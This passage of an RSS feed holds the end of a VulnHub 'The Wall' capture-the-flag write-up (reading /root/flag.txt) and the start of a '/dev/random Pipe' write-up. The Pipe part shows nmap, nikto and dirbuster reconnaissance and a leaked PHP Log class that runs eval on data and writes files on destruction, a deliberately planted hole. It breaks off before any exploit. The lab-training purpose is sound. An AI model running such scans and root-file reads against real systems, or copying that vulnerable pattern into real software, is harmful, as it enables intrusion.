&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cat&lt;/span&gt; /root/flag.txt

&lt;span class=&quot;s2&quot;&gt;&quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&quot;&lt;/span&gt;

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ &lt;span class=&quot;s1&quot;&gt;'__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,'&lt;/span&gt; , &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | ,&lt;span class=&quot;s1&quot;&gt;' |       |       |       | |
  |_|_______|_______|____ '&lt;/span&gt; | _ | | &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |&lt;span class=&quot;s1&quot;&gt;'\ _|_______|_______|_______|_|
  |     |       |       |   \  _'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'&lt;/span&gt;_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-&lt;span class=&quot;s1&quot;&gt;'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-'&lt;/span&gt; |  ,-. &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |       |       |     |
  |_____|_______|_______|_ | _ |-&lt;span class=&quot;s1&quot;&gt;'`-'&lt;/span&gt;  |  | ,&lt;span class=&quot;s1&quot;&gt;' _|_______|_______|_____|
  | |       |       |      |        |  '&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'        |       |       | |
  |_|_______|_______|______&quot;|_____  _,- o'&lt;/span&gt;__|_______|_______|_______|_|
  |     |       |       |       _,-&lt;span class=&quot;s1&quot;&gt;'    .       |       |       |     |
  |_____|_______|_______|_ _,--'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     _,-&lt;span class=&quot;s1&quot;&gt;'_____|_______|_______|_____|
  | |       |       |     '&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;_||-&lt;span class=&quot;s1&quot;&gt;' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'&lt;/span&gt;  __|_______|_______|_______|_|
  |     |       |       |       |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;_,-&lt;span class=&quot;s1&quot;&gt;'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; |   | __|_______|_______|_____|
  | |       |       |       &lt;span class=&quot;s1&quot;&gt;'  V/    |  |-'&lt;/span&gt; |__,    |       |       | |
  |_|_______|_______|_______|_______ _______&lt;span class=&quot;s1&quot;&gt;'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - &quot;the test bunnies&quot;

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here we have the flag! &lt;/p&gt;
</description>
        <pubDate>Mon, 07 Aug 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-the-wall/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-the-wall/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - /dev/random Pipe</title>
        <description>&lt;p&gt;Hello everyone, let's work on another machine from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; called &lt;b&gt;Pipe&lt;/b&gt;. Let's see how difficult it is! &lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/sagi-,36/&quot;&gt;&lt;b&gt;Sagi&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/devrandom-pipe,124/&quot;&gt;&lt;b&gt;/dev/random/ Pipe&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;&lt;/p&gt;
&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.102&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;As always we have to start from finding out the IP address of the vulnerable machine, with essential info about services running on it.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.1/24

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-29 16:13 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00015s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000067s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:1D:FF:E0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.101 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00014s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:39:B5:70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000024s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.102 are closed

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.83 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Basic info done, let's take a look at it. &lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;192.168.56.103&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Open ports: &lt;b&gt;22 SSH&lt;/b&gt;, &lt;b&gt;80 HTTP&lt;/b&gt; and &lt;b&gt;111 RPCBIND&lt;/b&gt;. &lt;/p&gt;
&lt;p&gt;We can start from the bottom, maybe SSH will print us some clues, which are essential for further exploitation. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh 192.168.56.103
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'192.168.56.103 (192.168.56.103)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:6CI3N5VMaSG6TNWPt/7nhor3Dd4ug8YJel9Ycv/Ytwc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;192.168.56.103&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
root@192.168.56.103'&lt;/span&gt;s password:
Permission denied, please try again.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately nothing here, no banners, no users, nothing. Maybe website wil be more useful?  Let's take a look at it. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/access.png&quot; alt=&quot;Access&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks as if &lt;b&gt;index.php&lt;/b&gt; file is password protected. Every popular credentials I entered showed &lt;b&gt;Unauthorized&lt;/b&gt; message, so we have to look further. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Unauthorized

This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;My next step is to run &lt;b&gt;nikto&lt;/b&gt; and &lt;b&gt;dirbuster&lt;/b&gt; scans to check for any hidden directories and possible vulnerabilities. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.103
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-07-29 16:21:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ IP address found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s1&quot;&gt;'location'&lt;/span&gt; header. The IP is &lt;span class=&quot;s2&quot;&gt;&quot;127.0.1.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+ OSVDB-630: IIS may reveal its internal or real IP &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the Location header via a request to the /images directory. The value is &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.1.1/images/&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
...
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ OSVDB-3268: /images/: Directory indexing found.
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ OSVDB-3268: /images/?pattern&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&amp;amp;sort&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;name: Directory indexing found.
+ / - Requires Authentication &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;realm &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;
+ 7685 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 7 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-07-29 16:21:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, images directory. This path &lt;b&gt;/images/pipe.jpg&lt;/b&gt; presents an image of a pipe. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/pipe.png&quot; alt=&quot;Pipe image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately, checking it for hidden messages wasn't so succesful, so I decided to look at dirbuster scan. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/dirbuster.png&quot; alt=&quot;Dirbuster&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another directory, and this one was missed by nikto. As these files may be very useful, let's take a look at them. &lt;/p&gt;
&lt;p&gt;&lt;b&gt;log.php.BAK&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	      &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PrintLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[LOG]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	      &lt;span class=&quot;nv&quot;&gt;$now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Y-m-d H:i:s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$pre - $now - $this-&amp;gt;data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;str = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	     &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;php.js&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//  discuss at: http://phpjs.org/functions/serialize/&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// original by: Arpad Ray (mailto:arpad@php.net)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Dino&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Le Torbi (http://www.letorbi.de/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Andrej Pavlovic&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Garagoth&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Russell Walker (http://www.nbill.co.uk/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Jamie Beck (http://www.terabit.ca/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Ben (http://benblume.co.uk/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//    input by: DtTvB (http://dt.in.th/2008-09-16.string-length-in-bytes.html)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//    input by: Martin (http://www.erlenwiese.de/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//        note: We feel the main purpose of this function should be to ease the transport of data between php &amp;amp; js&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//        note: Aiming for PHP-compatibility, we have to translate objects to arrays&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   example 1: serialize(['Kevin', 'van', 'Zonneveld']);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   returns 1: 'a:3:{i:0;s:5:&quot;Kevin&quot;;i:1;s:3:&quot;van&quot;;i:2;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   example 2: serialize({firstName: 'Kevin', midName: 'van', surName: 'Zonneveld'});&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   returns 2: 'a:3:{s:9:&quot;firstName&quot;;s:5:&quot;Kevin&quot;;s:7:&quot;midName&quot;;s:3:&quot;van&quot;;s:7:&quot;surName&quot;;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_utf8Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
